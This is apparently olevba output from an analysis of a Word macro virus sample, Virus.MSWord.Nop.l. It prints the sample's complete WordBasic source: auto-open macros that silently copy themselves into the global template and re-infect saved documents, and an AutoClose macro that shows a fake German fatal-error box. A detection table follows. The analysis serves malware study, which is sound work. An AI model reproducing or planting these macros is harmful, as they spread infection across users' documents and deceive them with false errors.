olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nop.l-3e1763fab0b102a8cbb27ce1a38b856c6400ac8d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nop.l-3e1763fab0b102a8cbb27ce1a38b856c6400ac8d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Nop.l-3e1763fab0b102a8cbb27ce1a38b856c6400ac8d - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.MsgBox "Kann auf Gerät nicht schreiben!", "Schwerer Ausnahmefehler!", 21
End Sub
-------------------------------------------------------------------------------
VBA MACRO AUTOOPEN.bas 
in file: Virus.MSWord.Nop.l-3e1763fab0b102a8cbb27ce1a38b856c6400ac8d - OLE stream: 'Macros/VBA/AUTOOPEN'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim m$
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
m$ = WordBasic.[FileName$]() + ":AutoClose"
WordBasic.MacroCopy m$, "Global:AutoClose"
m$ = WordBasic.[FileName$]() + ":AO"
WordBasic.MacroCopy m$, "Global:AUTOOPEN"
m$ = WordBasic.[FileName$]() + ":AUTOOPEN"
WordBasic.MacroCopy m$, "Global:AO"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AO.bas 
in file: Virus.MSWord.Nop.l-3e1763fab0b102a8cbb27ce1a38b856c6400ac8d - OLE stream: 'Macros/VBA/AO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim m$
Dim n$
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
m$ = WordBasic.[FileName$]() + ":AutoClose"
WordBasic.MacroCopy "Global:AutoClose", m$
m$ = WordBasic.[FileName$]() + ":AUTOOPEN"
WordBasic.MacroCopy "Global:AO", m$
m$ = WordBasic.[FileName$]() + ":AO"
WordBasic.MacroCopy "Global:AUTOOPEN", m$
n$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=n$, Format:=1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOOPEN            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

